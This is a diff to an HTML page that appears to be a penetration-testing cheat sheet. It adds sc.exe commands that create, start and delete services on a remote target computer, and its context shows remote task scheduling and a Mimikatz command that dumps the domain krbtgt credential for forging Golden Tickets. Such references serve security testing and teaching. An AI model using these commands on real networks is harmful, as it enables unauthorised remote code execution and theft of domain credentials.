@@ -1264,6 +1264,18 @@ schtasks<span class="w"> </span>/S<span class="w"> </span>&lt;target<span class=
 <p>Run tasks:</p>
 <div class="highlight"><pre><span></span><code>schtasks<span class="w"> </span>/run<span class="w"> </span>/TN<span class="w"> </span>&lt;task<span class="w"> </span>name&gt;<span class="w"> </span>/S<span class="w"> </span>&lt;target<span class="w"> </span>computer<span class="w"> </span>-<span class="w"> </span><span class="k">if</span><span class="w"> </span>remote&gt;
 </code></pre></div>
+<p>List Services:</p>
+<div class="highlight"><pre><span></span><code>sc.exe<span class="w"> </span>query
+</code></pre></div>
+<p>Create a service:</p>
+<div class="highlight"><pre><span></span><code>sc.exe<span class="w"> </span><span class="se">\\</span>&lt;target<span class="w"> </span>computer&gt;<span class="w"> </span>create<span class="w"> </span>&lt;service<span class="w"> </span>name&gt;<span class="w"> </span><span class="nv">binPath</span><span class="o">=</span><span class="w"> </span><span class="s2">"&lt;exe path&gt;"</span><span class="w"> </span><span class="nv">start</span><span class="o">=</span><span class="w"> </span>auto
+</code></pre></div>
+<p>Run service:</p>
+<div class="highlight"><pre><span></span><code>sc.exe<span class="w"> </span>&lt;Target<span class="w"> </span>Computer&gt;<span class="w"> </span>start<span class="w"> </span>&lt;service<span class="w"> </span>name&gt;
+</code></pre></div>
+<p>Delete service:</p>
+<div class="highlight"><pre><span></span><code>sc.exe<span class="w"> </span>&lt;Target<span class="w"> </span>Computer&gt;<span class="w"> </span>delete<span class="w"> </span>&lt;service<span class="w"> </span>name&gt;
+</code></pre></div>
 <h3 id="golden-silver-tickets">Golden &amp; Silver Tickets</h3>
 <p>Retrieve information needed to forge a Golden Ticket with Mimikatz:</p>
 <div class="highlight"><pre><span></span><code>lsadump::lsa<span class="w"> </span>/inject<span class="w"> </span>/name<span class="w"> </span>krbtgt
